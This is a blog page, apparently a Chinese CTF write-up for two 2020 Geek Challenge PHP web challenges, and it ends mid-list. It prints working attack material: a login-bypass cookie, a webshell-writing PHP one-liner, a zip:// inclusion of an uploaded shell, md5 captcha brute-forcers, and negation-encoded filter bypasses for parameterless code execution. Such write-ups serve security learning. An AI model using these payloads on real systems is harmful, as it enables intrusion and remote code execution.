@@ -1,0 +1,285 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2020极客大挑战 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Roamphp2-Myblog先是伪协议到处读文件..
+分别能读到home.php,login.php,secret.php，然后在login.php下看html能读到/admin/user.php,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2020极客大挑战</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2020极客大挑战</h1>
+        <div class="stuff">
+            <span>四月 27, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Roamphp2-Myblog"><a href="#Roamphp2-Myblog" class="headerlink" title="Roamphp2-Myblog"></a>Roamphp2-Myblog</h2><p>先是伪协议到处读文件..</p>
+<p>分别能读到home.php,login.php,secret.php，然后在login.php下看html能读到/admin/user.php</p>
+<p>感觉像是伪随机数爆破..</p>
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427135216661.png" alt="image-20210427135216661"></p>
+<p>审计代码后发现其实是可以绕过的，因为判断中对$_SESSIONpassword进行了对比，如果想要绕过的话将两者都是作为空即可</p>
+<p>故我们直接构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookies:</span><br><span class="line"></span><br><span class="line">username&#x3D;Longlone&amp;password&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>登陆上之后就可以找到上传点，给出了源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">           $tmp_file = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">           $tmp_path = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">               $allows = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">               <span class="keyword">if</span>(in_array($extension,$allows,<span class="literal">true</span>) <span class="keyword">and</span> in_array($_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params">$ext</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="literal">true</span>))&#123;</span><br><span class="line">                   $upload_name = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.$extension;</span><br><span class="line">                   move_uploaded_file($tmp_path,<span class="string">&quot;assets/img/upload/&quot;</span>.$upload_name);</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传之后我们再去index.php包含不就好了吗！。想到这里我们马上操作.结果突然想到在文件的最后会被加上php后缀名,这就没办法直接读取了,只能通过zip协议</p>
+<p>伪协议: file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;148886.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427143558838.png" alt="image-20210427143558838"></p>
+<p>题外话:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://input</span><br><span class="line"></span><br><span class="line">[POST DATA] &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">也可以POST如下内容生成一句话： &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么这样就简单了，写一个shell.php，然后压缩，再改后缀为jpg即可,</p>
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427144441817.png" alt="image-20210427144441817"></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0dad2d9e-f7fb-4cb0-905a-9860648d77ec.node3.buuoj.cn&#x2F;?page&#x3D;zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;upload&#x2F;d03ea7c190280b2369947674c89fb32c6e98f591.jpg%23shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="Roamphp4-Rceme"><a href="#Roamphp4-Rceme" class="headerlink" title="Roamphp4-Rceme"></a>Roamphp4-Rceme</h2><p>文件泄露..<br>swp的文件泄露是通过 .filename.swp的，比如：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">.index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p>脱下来之后得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**********************************</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 	author : Longlone</span></span><br><span class="line"><span class="comment">* 	 type  : Backup</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**********************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(substr(md5($_POST[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== $_SESSION[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    $code = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>code我们可以通过爆破来得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($a), <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;f815a&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($a.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $a++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>六位数以下都可以爆破..超过六位数的话会很难出</p>
+<p>这里再贴上一个别的师傅的python的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>    <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2e2f0&#x27;</span>    <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>    <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])    <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:    <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]    <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):    <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>)    <span class="comment"># 函数与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+
+<p>（顺便php的性能跑得比python快很多啊</p>
+<p>异或这题挣不出来，思路不是这个，但是依然贴个异或脚本过来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$a = <span class="string">&#x27;~!@#$%^&amp;*()_+\|/?.,&lt;&gt;`-=&#123;&#125;[]&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ord($a[$i]^$a[$j])&gt;<span class="number">64</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">91</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span> (ord($a[$i]^$a[$j])&gt;<span class="number">96</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">122</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>   chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>    <span class="string">&#x27;  &#x27;</span> .ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vaild = <span class="string">&quot;!@&amp;%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;?-=_`~&quot;</span></span><br><span class="line"></span><br><span class="line">answer =<span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tmp,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vaild:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> vaild:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) ==<span class="built_in">ord</span>(c):</span><br><span class="line">                tmp+=j</span><br><span class="line">                tmp+=i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(tmp,tmp2)</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，这里需要一个trick，取反的时候其实可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~取反值][!%FF]</span><br></pre></td></tr></table></figure>
+
+<p>这样来构造..我们先试试看执行phpinfo();</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=[~%8F%97%8F%96%91%99%90][!%FF]();&amp;code=653808</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427170155926.png" alt="image-20210427170155926"></p>
+<p>发现成功执行。【顺便踩坑，不能用postman去做，自己在这里卡了好久 = = 卧槽</p>
+<p>再之后尝试配合着打无参数RCE</p>
+<p>膜王叹之师傅【</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12311239.html</span><br></pre></td></tr></table></figure>
+
+<p>收集知识：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current(localeconv());</span><br><span class="line">pos(localeconv())</span><br></pre></td></tr></table></figure>
+
+<p>就是两个点，所以我们可以用这两个扫目录：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>
+
+<p>取反一波：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$a = &quot;%8C%86%8C%8B%9A%92&quot;;</span></span><br><span class="line"><span class="comment">//echo (~urldecode($a));</span></span><br><span class="line">$b = <span class="string">&quot;localeconv&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode((~$b));</span><br><span class="line"><span class="comment">//print_r(scandir(pos(localeconv())))</span></span><br><span class="line"><span class="comment">//var_dump =%89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//getallheaders =%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</span></span><br><span class="line"><span class="comment">//phpinfo [~%8F%97%8F%96%91%99%90][!%FF]();</span></span><br><span class="line"><span class="comment">//print_r %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">//scandir %8C%9C%9E%91%9B%96%8D</span></span><br><span class="line"><span class="comment">//current %9C%8A%8D%8D%9A%91%8B</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//localeconv %93%90%9C%9E%93%9A%9C%90%91%89</span></span><br><span class="line"><span class="comment">//拼起来：[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));</span></span><br></pre></td></tr></table></figure>
+
+<p>得出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=[~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>F%<span class="number">90</span>%<span class="number">8</span>C][!%FF]([~%<span class="number">93</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>][!%FF]())));&amp;code=<span class="number">217941</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427180311201.png" alt="image-20210427180311201"></p>
+<p>结果flag不在这里，wdnmd。如果一直跟到根目录的话实在太恶心太长了。</p>
+<p>转换一下思路好了：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=[~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]()));&amp;code=<span class="number">186656</span></span><br></pre></td></tr></table></figure>
+
+<p>但是在这种思路下的话，因为拥有空格，就会导致每次的验证码都不停的在变就很烦，所以我们每次都会遭遇验证码错误。。没办法用空格的话再用${IFS}$9试试看</p>
+<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427201800222.png" alt="image-20210427201800222"></p>
+<p>结果依然出不来。。很烦，不知道为什么，MD，。大概是cookies不允许，想了想整个别的活</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]()));</span><br></pre></td></tr></table></figure>
+
+<p>结果想法依然没办法成功，cookies只要携带特殊符号就会验证码不通过，这下就恶心到我了。</p>
+<p>翻出别人的总结:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           